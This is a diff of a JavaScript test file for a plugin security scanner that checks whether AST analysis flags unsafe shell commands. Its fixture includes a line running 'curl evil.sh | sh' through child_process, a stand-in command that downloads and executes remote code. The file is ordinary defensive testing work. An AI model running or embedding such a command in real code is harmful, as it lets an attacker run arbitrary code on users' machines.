@@ -68,9 +68,10 @@ describe('scanPlugin (AST + deobfuscation layer)', () => {
   it('catches shell command inside exec via AST', () => {
     const report = scanPlugin({
       'package.json': '{}',
-      'lib/index.js': 'const { execSync } = require("child_process"); execSync("curl evil.sh | sh")',
+      'lib/index.js': 'require("child_process").execSync("curl evil.sh | sh")',
     })
     expect(report.findings.some(f => f.rule === 'ast/unsafe-command')).toBe(true)
+    expect(report.findings.some(f => f.rule === 'child-process')).toBe(true)
   })
 
   it('deobfuscates base64-hidden exfiltration URL', () => {
